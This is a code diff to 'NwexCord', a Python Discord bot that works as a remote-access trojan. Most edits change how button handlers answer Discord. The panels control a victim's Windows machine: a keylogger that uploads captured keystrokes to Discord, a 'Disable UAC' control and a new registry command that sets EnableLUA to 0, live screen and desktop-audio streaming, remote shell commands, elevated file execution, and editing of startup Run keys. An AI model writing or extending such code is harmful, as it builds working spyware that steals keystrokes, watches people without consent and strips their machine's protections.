@@ -381,9 +381,10 @@ class ActiveWindowsView(discord.ui.View):
     
     @discord.ui.button(label="Refresh", emoji="🔄", style=discord.ButtonStyle.success, row=1)
     async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
         embed, windows = build_activewindows_embed(self.session_id)
         view = ActiveWindowsView(self.session_id)
-        await interaction.response.edit_message(content=None, embed=embed, view=view)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="Close", emoji="❌", style=discord.ButtonStyle.danger, row=1)
     async def close_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -391,6 +392,7 @@ class ActiveWindowsView(discord.ui.View):
             await interaction.response.send_message("❌ Please select a window first!", ephemeral=True)
             return
         
+        await interaction.response.defer()
         target = self.windows_data[self.selected_idx]
         success, msg = ActiveWindowsManager.close_window(target['handle'])
         
@@ -404,7 +406,7 @@ class ActiveWindowsView(discord.ui.View):
             embed.add_field(name="❌ Failed", value=f"`{target['title']}` — {msg}", inline=False)
         
         view = ActiveWindowsView(self.session_id)
-        await interaction.response.edit_message(content=None, embed=embed, view=view)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="Back to Tools", emoji="⬅", style=discord.ButtonStyle.secondary, row=1)
     async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -595,10 +597,11 @@ class TCPConnectionsView(discord.ui.View):
     
     @discord.ui.button(label="Refresh", emoji="\ud83d\udd04", style=discord.ButtonStyle.success, row=1)
     async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
         new_conns = TCPConnectionsManager.get_connections()
         embed, conns, pg, tp = build_tcp_embed(self.session_id, 0, new_conns)
         view = TCPConnectionsView(self.session_id, 0, new_conns)
-        await interaction.response.edit_message(content=None, embed=embed, view=view)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
         
     @discord.ui.button(label="Close", emoji="\u274c", style=discord.ButtonStyle.danger, row=1)
     async def close_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -606,6 +609,7 @@ class TCPConnectionsView(discord.ui.View):
             await interaction.response.send_message("\u274c Please select a connection first!", ephemeral=True)
             return
             
+        await interaction.response.defer()
         target = self.connections[self.selected_idx]
         success, msg = TCPConnectionsManager.close_connection(target['pid'])
         
@@ -626,7 +630,7 @@ class TCPConnectionsView(discord.ui.View):
             embed.add_field(name="\u274c Failed", value=f"`PID: {target['pid']}` \u2014 {msg}", inline=False)
             
         view = TCPConnectionsView(self.session_id, pg, new_conns)
-        await interaction.response.edit_message(content=None, embed=embed, view=view)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="Back to Tools", emoji="\u2b05", style=discord.ButtonStyle.secondary, row=1)
     async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -1054,9 +1058,10 @@ class RegistryView(discord.ui.View):
     
     @discord.ui.button(label="Refresh", emoji="🔄", style=discord.ButtonStyle.success, row=2)
     async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
         embed = build_registry_embed(self.current_path, self.session_id)
         view = RegistryView(self.current_path, self.session_id, page=self.page)
-        await interaction.response.edit_message(content=None, embed=embed, view=view)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="New Value", emoji="📝", style=discord.ButtonStyle.primary, row=3)
     async def newvalue_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -1067,17 +1072,19 @@ class RegistryView(discord.ui.View):
     
     @discord.ui.button(label="HKCU Run", emoji="👤", style=discord.ButtonStyle.secondary, row=3)
     async def hkcu_run_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
         path = r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
         embed = build_registry_embed(path, self.session_id)
         view = RegistryView(path, self.session_id, page=0)
-        await interaction.response.edit_message(content=None, embed=embed, view=view)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="HKLM Run", emoji="💻", style=discord.ButtonStyle.secondary, row=3)
     async def hklm_run_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
         path = r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
         embed = build_registry_embed(path, self.session_id)
         view = RegistryView(path, self.session_id, page=0)
-        await interaction.response.edit_message(content=None, embed=embed, view=view)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="Back to Tools", emoji="⬅", style=discord.ButtonStyle.secondary, row=4)
     async def back_tools_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -1338,6 +1345,7 @@ class StartupManagerView(discord.ui.View):
             await interaction.response.send_message("❌ Please select a startup item first!", ephemeral=True)
             return
         
+        await interaction.response.defer()
         target = self.items_data[self.selected_idx]
         success, msg = StartupManager.remove_item(target)
         
@@ -1351,14 +1359,15 @@ class StartupManagerView(discord.ui.View):
             embed.add_field(name="❌ Failed", value=f"`{target['name']}` — {msg}", inline=False)
         
         view = StartupManagerView(self.session_id, new_items)
-        await interaction.response.edit_message(content=None, embed=embed, view=view)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="Refresh", emoji="🔄", style=discord.ButtonStyle.success, row=1)
     async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
         new_items = StartupManager.get_all_items()
         embed, items = build_startup_embed(self.session_id, new_items)
         view = StartupManagerView(self.session_id, new_items)
-        await interaction.response.edit_message(content=None, embed=embed, view=view)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="Back to Tools", emoji="⬅", style=discord.ButtonStyle.secondary, row=1)
     async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -1617,10 +1626,11 @@ class ProcessManagerView(discord.ui.View):
     
     @discord.ui.button(label="Refresh", emoji="\ud83d\udd04", style=discord.ButtonStyle.success, row=1)
     async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
         new_procs = ProcessManager.get_processes()
         embed, procs, pg, tp = build_process_embed(self.session_id, 0, new_procs)
         view = ProcessManagerView(self.session_id, 0, new_procs)
-        await interaction.response.edit_message(content=None, embed=embed, view=view)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="Close", emoji="\ud83d\udeab", style=discord.ButtonStyle.danger, row=1)
     async def close_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -1629,6 +1639,7 @@ class ProcessManagerView(discord.ui.View):
             await interaction.response.send_message("\u274c Please select a process first!", ephemeral=True)
             return
         
+        await interaction.response.defer()
         success, msg = ProcessManager.close_process(target['pid'])
         new_procs = ProcessManager.get_processes()
         
@@ -1645,7 +1656,7 @@ class ProcessManagerView(discord.ui.View):
             embed.add_field(name="\u274c Failed", value=f"`{target['name']}` \u2014 {msg}", inline=False)
         
         view = ProcessManagerView(self.session_id, pg, new_procs)
-        await interaction.response.edit_message(content=None, embed=embed, view=view)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="Restart", emoji="\ud83d\udd04", style=discord.ButtonStyle.primary, row=2)
     async def restart_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -1654,6 +1665,7 @@ class ProcessManagerView(discord.ui.View):
             await interaction.response.send_message("\u274c Please select a process first!", ephemeral=True)
             return
         
+        await interaction.response.defer()
         success, msg = ProcessManager.restart_process(target['pid'], target['name'])
         new_procs = ProcessManager.get_processes()
         
@@ -1670,7 +1682,7 @@ class ProcessManagerView(discord.ui.View):
             embed.add_field(name="\u274c Failed", value=f"`{target['name']}` \u2014 {msg}", inline=False)
         
         view = ProcessManagerView(self.session_id, pg, new_procs)
-        await interaction.response.edit_message(content=None, embed=embed, view=view)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="Suspend", emoji="\u23f8", style=discord.ButtonStyle.secondary, row=2)
     async def suspend_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -1679,6 +1691,7 @@ class ProcessManagerView(discord.ui.View):
             await interaction.response.send_message("\u274c Please select a process first!", ephemeral=True)
             return
         
+        await interaction.response.defer()
         success, msg = ProcessManager.suspend_process(target['pid'])
         embed, procs, pg, tp = build_process_embed(self.session_id, self.page, self.processes_data, selected_idx=self.selected_idx)
         
@@ -1688,7 +1701,7 @@ class ProcessManagerView(discord.ui.View):
             embed.add_field(name="\u274c Failed", value=f"`{target['name']}` \u2014 {msg}", inline=False)
         
         view = ProcessManagerView(self.session_id, self.page, self.processes_data, selected_idx=self.selected_idx)
-        await interaction.response.edit_message(content=None, embed=embed, view=view)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="Resume", emoji="\u25b6", style=discord.ButtonStyle.secondary, row=2)
     async def resume_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -1697,6 +1710,7 @@ class ProcessManagerView(discord.ui.View):
             await interaction.response.send_message("\u274c Please select a process first!", ephemeral=True)
             return
         
+        await interaction.response.defer()
         success, msg = ProcessManager.resume_process(target['pid'])
         embed, procs, pg, tp = build_process_embed(self.session_id, self.page, self.processes_data, selected_idx=self.selected_idx)
         
@@ -1706,7 +1720,7 @@ class ProcessManagerView(discord.ui.View):
             embed.add_field(name="\u274c Failed", value=f"`{target['name']}` \u2014 {msg}", inline=False)
         
         view = ProcessManagerView(self.session_id, self.page, self.processes_data, selected_idx=self.selected_idx)
-        await interaction.response.edit_message(content=None, embed=embed, view=view)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="Back to Tools", emoji="\u2b05", style=discord.ButtonStyle.secondary, row=2)
     async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -1896,10 +1910,11 @@ class InstalledProgramsView(discord.ui.View):
     
     @discord.ui.button(label="Refresh", emoji="\ud83d\udd04", style=discord.ButtonStyle.success, row=1)
     async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
         new_progs = InstalledProgramsManager.get_programs()
         embed, progs, pg, tp = build_programs_embed(self.session_id, 0, new_progs)
         view = InstalledProgramsView(self.session_id, 0, new_progs)
-        await interaction.response.edit_message(content=None, embed=embed, view=view)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="Uninstall", emoji="\ud83d\udeab", style=discord.ButtonStyle.danger, row=1)
     async def uninstall_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -2490,6 +2505,7 @@ class FunPanelView(discord.ui.View):
     # Row 3: Back
     @discord.ui.button(label="⬅ Back to Info", style=discord.ButtonStyle.secondary, row=3)
     async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
         info = get_sys_info()
         left_col = (
             f"🌐 **IP** : {info.get('IP', 'Unknown')}\n"
@@ -2522,7 +2538,7 @@ class FunPanelView(discord.ui.View):
         embed.add_field(name="\u200b", value=right_col, inline=True)
         embed.set_footer(text=f"NwexCord • System Information • {datetime.now().strftime('Today at %#I:%M %p')}")
         msg_content = f"🚀 **NwexCord System Started!**\nUse `.shell <command>` to execute CMD/PowerShell commands on this machine."
-        await interaction.response.edit_message(content=msg_content, embed=embed, view=StartupView())
+        await interaction.edit_original_response(content=msg_content, embed=embed, view=StartupView())
 
 
 class ToolsPanelView(discord.ui.View):
@@ -2532,40 +2548,45 @@ class ToolsPanelView(discord.ui.View):
     
     @discord.ui.button(label="Registry Editor", emoji="🔑", style=discord.ButtonStyle.secondary, row=0)
     async def registry_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
         session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
         embed = build_registry_embed("", session_id)
         view = RegistryView("", session_id)
-        await interaction.response.edit_message(content=None, embed=embed, view=view)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="Active Windows", emoji="🪟", style=discord.ButtonStyle.secondary, row=0)
     async def activewindows_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
         session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
         embed, windows = build_activewindows_embed(session_id)
         view = ActiveWindowsView(session_id)
-        await interaction.response.edit_message(content=None, embed=embed, view=view)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="TCP Connections", emoji="🌐", style=discord.ButtonStyle.secondary, row=0)
     async def tcp_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
         session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
         embed, conns, pg, tp = build_tcp_embed(session_id)
         view = TCPConnectionsView(session_id, pg, conns)
-        await interaction.response.edit_message(content=None, embed=embed, view=view)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="Startup Manager", emoji="🚀", style=discord.ButtonStyle.secondary, row=0)
     async def startup_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
         session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
         items = StartupManager.get_all_items()
         embed, items = build_startup_embed(session_id, items)
         view = StartupManagerView(session_id, items)
-        await interaction.response.edit_message(content=None, embed=embed, view=view)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="Process Manager", emoji="📊", style=discord.ButtonStyle.secondary, row=1)
     async def process_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
         session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
         procs = ProcessManager.get_processes()
         embed, procs, pg, tp = build_process_embed(session_id, 0, procs)
         view = ProcessManagerView(session_id, pg, procs)
-        await interaction.response.edit_message(content=None, embed=embed, view=view)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="Service Manager", emoji="🔧", style=discord.ButtonStyle.secondary, row=1)
     async def service_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -2577,11 +2598,12 @@ class ToolsPanelView(discord.ui.View):
     
     @discord.ui.button(label="Installed Programs", emoji="💿", style=discord.ButtonStyle.secondary, row=1)
     async def programs_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
         session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
         progs = InstalledProgramsManager.get_programs()
         embed, progs, pg, tp = build_programs_embed(session_id, 0, progs)
         view = InstalledProgramsView(session_id, pg, progs)
-        await interaction.response.edit_message(content=None, embed=embed, view=view)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
     
     @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary, row=2)
     async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -2929,36 +2951,45 @@ class LiveStreamManager:
                     if default_speakers["name"] in loopback["name"]:
                         default_speakers = loopback
                         break
+            
+            rate = int(default_speakers["defaultSampleRate"])
+            channels = default_speakers["maxInputChannels"]
                         
             stream = p.open(format=pyaudio.paInt16,
-                channels=default_speakers["maxInputChannels"],
-                rate=int(default_speakers["defaultSampleRate"]),
-                frames_per_buffer=2048,
+                channels=channels,
+                rate=rate,
+                frames_per_buffer=1024,
                 input=True,
                 input_device_index=default_speakers["index"],
             )
             
-            yield LiveStreamManager._gen_wav_header(
-                int(default_speakers["defaultSampleRate"]),
-                default_speakers["maxInputChannels"],
-                16
-            )
+            yield LiveStreamManager._gen_wav_header(rate, channels, 16)
             
             last_data = None
-            # 2 bytes per sample (16-bit)
-            empty_data = b'\x00' * (2048 * default_speakers["maxInputChannels"] * 2)
-            sleep_time = 2048 / int(default_speakers["defaultSampleRate"])
+            # 1024 samples @ 16-bit
+            empty_data = b'\x00' * (1024 * channels * 2)
+            
+            import numpy as np
             
             while LiveStreamManager._is_running:
+                try:
+                    # Non-blocking read or check avail to avoid stalls
+                    data = stream.read(1024, exception_on_overflow=False)
+                except Exception:
+                    break
+                
                 if not LiveStreamManager._audio_enabled:
                     yield empty_data
-                    time.sleep(sleep_time)
                     continue
                     
-                data = stream.read(2048, exception_on_overflow=False)
+                # Advanced repetition & silence check
+                audio_data = np.frombuffer(data, dtype=np.int16)
+                # RMS energy calculation
+                energy = np.sqrt(np.mean(audio_data.astype(np.float32)**2))
                 
-                # PyAudio WASAPI loopback glitch: repeats last buffer when silent.
-                if data == last_data and data != empty_data:
+                # WASAPI loopback glitch often repeats the exact same buffer when playback stops.
+                # Also, if energy is effectively silent (noise floor), don't waste bandwidth.
+                if energy < 40 or data == last_data:
                     yield empty_data
                 else:
                     last_data = data
@@ -3039,36 +3070,57 @@ class LiveStreamManager:
                 <title>NwexCord Live Stream</title>
                 <meta name="viewport" content="width=device-width, initial-scale=1">
                 <style>
-                  body {{ background-color: #0e0e10; color: #fff; text-align: center; margin: 0; padding: 0; overflow: hidden; font-family: sans-serif; }}
-                  #controls {{ position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.8); padding: 10px; border-radius: 8px; z-index: 999; display: flex; gap: 10px; transition: opacity 0.3s; }}
+                  body {{ background-color: #0e0e10; color: #fff; text-align: center; margin: 0; padding: 0; overflow: hidden; font-family: 'Segoe UI', sans-serif; height: 100vh; width: 100vw; }}
+                  #controls {{ position: absolute; top: 15px; left: 15px; background: rgba(20,20,25,0.9); padding: 15px; border-radius: 12px; z-index: 999; display: flex; gap: 12px; border: 1px solid #333; box-shadow: 0 4px 15px rgba(0,0,0,0.5); transition: opacity 0.3s; opacity: 0.8; }}
                   #controls:hover {{ opacity: 1; }}
-                  select, button {{ background: #2f3136; color: white; border: 1px solid #4f545c; padding: 5px 10px; border-radius: 4px; outline: none; cursor: pointer; }}
-                  select:hover, button:hover {{ background: #4f545c; }}
-                  img {{ width: 100vw; height: 100vh; object-fit: contain; }}
+                  select, button {{ background: #2f3136; color: white; border: 1px solid #4f545c; padding: 8px 12px; border-radius: 6px; outline: none; cursor: pointer; font-weight: 500; transition: 0.2s; }}
+                  select:hover, button:hover {{ background: #4f545c; border-color: #7289da; }}
+                  #audio_toggle {{ background: #43b581; color: white; border: none; min-width: 140px; }}
+                  #audio_toggle.active {{ background: #ed4245; }}
+                  img {{ width: 100vw; height: 100vh; object-fit: contain; display: block; }}
+                  .status-dot {{ display: inline-block; width: 8px; height: 8px; background: #43b581; border-radius: 50%; margin-right: 5px; }}
                 </style>
               </head>
               <body>
                 <div id="controls">
-                  <select id="monitor" onchange="updateSettings()">
-                    {monitor_opts}
-                  </select>
-                  <select id="res" onchange="updateSettings()">
-                    {res_opts}
-                  </select>
-                  <button onclick="document.getElementById('stream_img').src='/stream?'+new Date().getTime()">Refresh Screen</button>
-                  <button id="audio_toggle" onclick="toggleAudio()">{audio_btn_text}</button>
-                  <audio id="desktop_audio" controls src="/audio" style="height: 30px;"></audio>
+                  <div style="display: flex; flex-direction: column; gap: 8px; align-items: flex-start;">
+                    <div style="font-size: 0.8em; color: #aaa; margin-bottom: 2px;"><span class="status-dot"></span>LIVE SCREEN</div>
+                    <div style="display: flex; gap: 10px;">
+                      <select id="monitor" onchange="updateSettings()">{monitor_opts}</select>
+                      <select id="res" onchange="updateSettings()">{res_opts}</select>
+                    </div>
+                    <div style="display: flex; gap: 10px; width: 100%;">
+                      <button id="audio_toggle" onclick="toggleAudio()">🔊 Join Live Audio</button>
+                      <button onclick="location.reload()">🔄 Refresh</button>
+                    </div>
+                  </div>
                 </div>
+                
                 <img id="stream_img" src="/stream" />
+                
+                <audio id="desktop_audio" style="display: none;"></audio>
                 
                 <script>
                   let controls = document.getElementById("controls");
                   let timeout;
+                  let audioUnlocked = false;
+
                   document.addEventListener("mousemove", () => {{
                     controls.style.opacity = "1";
                     clearTimeout(timeout);
-                    timeout = setTimeout(() => controls.style.opacity = "0.2", 2000);
+                    timeout = setTimeout(() => controls.style.opacity = "0.2", 3000);
                   }});
+                  
+                  // Unlock audio on first user click anywhere
+                  document.body.addEventListener('click', () => {{
+                    if (!audioUnlocked) {{
+                        const audio = document.getElementById("desktop_audio");
+                        audio.play().catch(() => {{}}); // Attempt to play empty buffer to unlock
+                        audio.pause();
+                        audioUnlocked = true;
+                        console.log("Audio Unlocked");
+                    }}
+                  }}, {{once: false}});
                   
                   function updateSettings() {{
                     const mon = document.getElementById("monitor").value;
@@ -3081,21 +3133,28 @@ class LiveStreamManager:
                   }}
                   
                   function toggleAudio() {{
-                    fetch("/config", {{
-                      method: "POST",
-                      headers: {{"Content-Type": "application/json"}},
-                      body: JSON.stringify({{toggle_audio: true}})
-                    }}).then(res => res.json()).then(data => {{
-                      if (data.audio_enabled) document.getElementById("audio_toggle").innerText = "Disable Audio";
-                      else document.getElementById("audio_toggle").innerText = "Enable Audio";
-                    }});
+                    const audio = document.getElementById("desktop_audio");
+                    const btn = document.getElementById("audio_toggle");
+                    
+                    if (audio.paused || !audio.src) {{
+                        // IMPORTANT: Add unique timestamp to URL to force browser to dump old buffers
+                        // and connect to a FRESH stream session. This fixes the feedback loop/stale audio.
+                        btn.innerText = "⏳ Connecting...";
+                        audio.src = "/audio?t=" + new Date().getTime();
+                        audio.play().then(() => {{
+                            btn.innerText = "🔇 Stop Listening";
+                            btn.classList.add("active");
+                        }}).catch(e => {{
+                            btn.innerText = "🔊 Join Live Audio";
+                            console.error("Audio playback error:", e);
+                        }});
+                    }} else {{
+                        audio.pause();
+                        audio.src = ""; // Completely disconnect to stop bandwidth/loops
+                        btn.innerText = "🔊 Join Live Audio";
+                        btn.classList.remove("active");
+                    }}
                   }}
-                  
-                  // Fix strict autoplay policies by playing audio on interaction
-                  document.body.addEventListener('click', () => {{
-                    let audio = document.getElementById("desktop_audio");
-                    if(audio.paused) audio.play();
-                  }}, {{once: true}});
                 </script>
               </body>
             </html>
@@ -3265,9 +3324,11 @@ class PerformanceView(discord.ui.View):
 
     @discord.ui.button(label="Refresh", emoji="🔄", style=discord.ButtonStyle.success, row=0)
     async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        data = SystemManager.get_performance()
+        await interaction.response.defer()
+        loop = asyncio.get_event_loop()
+        data = await loop.run_in_executor(None, SystemManager.get_performance)
         embed = build_performance_embed(self.session_id, data)
-        await interaction.response.edit_message(content=None, embed=embed, view=PerformanceView(self.session_id))
+        await interaction.edit_original_response(content=None, embed=embed, view=PerformanceView(self.session_id))
 
     @discord.ui.button(label="Back to System", emoji="⬅", style=discord.ButtonStyle.secondary, row=0)
     async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -3509,13 +3570,14 @@ class SystemPanelView(discord.ui.View):
 
     @discord.ui.button(label="Disable UAC", emoji="🛡️", style=discord.ButtonStyle.danger, row=1)
     async def uac_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
         loop = asyncio.get_event_loop()
         success, msg = await loop.run_in_executor(None, SystemManager.disable_uac)
         status = "✅" if success else "❌"
         color = discord.Color.green() if success else discord.Color.red()
         embed = discord.Embed(title=f"{status} Disable UAC", description=msg, color=color)
         embed.set_footer(text="NwexCord • System")
-        await interaction.response.edit_message(content=None, embed=embed, view=SystemResultView())
+        await interaction.edit_original_response(content=None, embed=embed, view=SystemResultView())
 
     @discord.ui.button(label="KeyLogger", emoji="⌨️", style=discord.ButtonStyle.secondary, row=1)
     async def keylogger_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -3547,6 +3609,7 @@ class SystemPanelView(discord.ui.View):
 
     @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary, row=2)
     async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
         info = get_sys_info()
         left_col = (
             f"🌐 **IP** : {info.get('IP', 'Unknown')}\n"
@@ -3579,7 +3642,7 @@ class SystemPanelView(discord.ui.View):
         embed.add_field(name="\u200b", value=right_col, inline=True)
         embed.set_footer(text=f"NwexCord • System Information • {datetime.now().strftime('Today at %#I:%M %p')}")
         msg_content = f"🚀 **NwexCord System Started!**\nUse `.shell <command>` to execute CMD/PowerShell commands on this machine."
-        await interaction.response.edit_message(content=msg_content, embed=embed, view=StartupView())
+        await interaction.edit_original_response(content=msg_content, embed=embed, view=StartupView())
 
 
 class KeyLoggerView(discord.ui.View):
@@ -3589,14 +3652,16 @@ class KeyLoggerView(discord.ui.View):
 
     @discord.ui.button(label="Start", emoji="▶", style=discord.ButtonStyle.success, row=0)
     async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
         success, msg = SystemManager.start_keylogger()
         status = "✅" if success else "❌"
         embed = discord.Embed(title=f"{status} KeyLogger", description=msg, color=discord.Color.green() if success else discord.Color.red())
         embed.set_footer(text="NwexCord • System")
-        await interaction.response.edit_message(content=None, embed=embed, view=KeyLoggerView())
+        await interaction.edit_original_response(content=None, embed=embed, view=KeyLoggerView())
 
     @discord.ui.button(label="Stop", emoji="⏹", style=discord.ButtonStyle.danger, row=0)
     async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
         success, msg, logged = SystemManager.stop_keylogger()
         desc = msg
         if logged:
@@ -3607,21 +3672,22 @@ class KeyLoggerView(discord.ui.View):
                 file = discord.File(buf, filename="keylog.txt")
                 embed = discord.Embed(title="⏹ KeyLogger Stopped", description=f"{msg}\n\nLogged {len(logged)} characters. See attached file.", color=discord.Color.green())
                 embed.set_footer(text="NwexCord • System")
-                await interaction.response.edit_message(content=None, embed=embed, attachments=[file], view=KeyLoggerView())
+                await interaction.edit_original_response(content=None, embed=embed, attachments=[file], view=KeyLoggerView())
                 return
             else:
                 desc += f"\n\n**Logged keys:**\n```\n{logged}\n```"
         embed = discord.Embed(title="⏹ KeyLogger Stopped", description=desc, color=discord.Color.green() if success else discord.Color.red())
         embed.set_footer(text="NwexCord • System")
-        await interaction.response.edit_message(content=None, embed=embed, view=KeyLoggerView())
+        await interaction.edit_original_response(content=None, embed=embed, view=KeyLoggerView())
 
     @discord.ui.button(label="Dump", emoji="📄", style=discord.ButtonStyle.primary, row=0)
     async def dump_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
         logged = SystemManager.get_keylogger_dump()
         if not logged:
             embed = discord.Embed(title="📄 KeyLogger Dump", description="*No keys logged yet.*", color=discord.Color.greyple())
             embed.set_footer(text="NwexCord • System")
-            await interaction.response.edit_message(content=None, embed=embed, view=KeyLoggerView())
+            await interaction.edit_original_response(content=None, embed=embed, view=KeyLoggerView())
             return
         if len(logged) > 1500:
             buf = io.BytesIO(logged.encode('utf-8'))
@@ -3629,15 +3695,1206 @@ class KeyLoggerView(discord.ui.View):
             file = discord.File(buf, filename="keylog_dump.txt")
             embed = discord.Embed(title="📄 KeyLogger Dump", description=f"Logged {len(logged)} characters. See attached file.", color=discord.Color.blue())
             embed.set_footer(text="NwexCord • System")
-            await interaction.response.edit_message(content=None, embed=embed, attachments=[file], view=KeyLoggerView())
+            await interaction.edit_original_response(content=None, embed=embed, attachments=[file], view=KeyLoggerView())
         else:
             embed = discord.Embed(title="📄 KeyLogger Dump", description=f"```\n{logged}\n```", color=discord.Color.blue())
             embed.set_footer(text="NwexCord • System")
-            await interaction.response.edit_message(content=None, embed=embed, view=KeyLoggerView())
+            await interaction.edit_original_response(content=None, embed=embed, view=KeyLoggerView())
 
     @discord.ui.button(label="Back to System", emoji="⬅", style=discord.ButtonStyle.secondary, row=1)
     async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.edit_message(content=None, embed=embed_system_panel(), attachments=[], view=SystemPanelView())
+
+
+# ========================================
+# Windows Panel
+# ========================================
+
+class WindowsManager:
+    """Helper class for Windows panel operations."""
+
+    @staticmethod
+    def run_file(file_path: str):
+        """Run a file on the target machine."""
+        try:
+            if not os.path.exists(file_path):
+                return False, f"File not found: {file_path}"
+            subprocess.Popen(file_path, shell=True)
+            return True, f"File launched: `{file_path}`"
+        except Exception as e:
+            return False, str(e)
+
+    @staticmethod
+    def run_elevated(file_path: str):
+        """Run a program as administrator using ShellExecuteW."""
+        try:
+            if not os.path.exists(file_path):
+                return False, f"File not found: {file_path}"
+            ret = ctypes.windll.shell32.ShellExecuteW(
+                None, "runas", file_path, None, None, 1
+            )
+            if ret > 32:
+                return True, f"Launched as administrator: `{file_path}`"
+            else:
+                return False, f"ShellExecute failed with code {ret}."
+        except Exception as e:
+            return False, str(e)
+
+    @staticmethod
+    def uac_bypass(enable: bool):
+        """Enable or Disable UAC via registry."""
+        try:
+            value = "1" if enable else "0"
+            cmd = f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d {value} /f'
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace')
+            if result.returncode == 0:
+                state = "Enabled" if enable else "Disabled"
+                return True, f"UAC {state}. Restart required to take effect."
+            return False, result.stderr.strip() or "Failed to modify UAC."
+        except Exception as e:
+            return False, str(e)
+    
+    @staticmethod
+    def get_uac_status():
+        """Get current UAC status."""
+        try:
+            result = subprocess.run(
+                'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA',
+                shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace'
+            )
+            if "0x1" in result.stdout:
+                return True  # Enabled
+            return False  # Disabled
